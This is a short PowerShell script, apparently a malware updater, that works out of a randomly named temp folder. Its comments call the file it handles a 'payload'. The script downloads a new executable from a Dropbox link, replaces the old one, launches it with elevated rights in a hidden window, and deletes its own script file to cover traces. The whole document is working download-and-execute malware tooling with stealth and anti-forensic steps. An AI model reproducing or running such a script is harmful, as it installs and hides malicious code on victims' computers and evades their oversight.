#change directory
cd $env:temp/sVBXKuz

#download updated payload
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/36hpp0y42mkwe3rdv9uwc/wsappa-1.4.exe?rlkey=80dozbkw1nrlupsfyx0ff6rms&dl=0" -OutFile new_wsappa.exe

#sleep
start-sleep 5

#remove old payload
remove-item wsappa.exe

#change name
rename-item new_wsappa.exe wsappa.exe

#sleep
start-sleep 5

#start new payload
Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden

#sleep
start-sleep 5

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
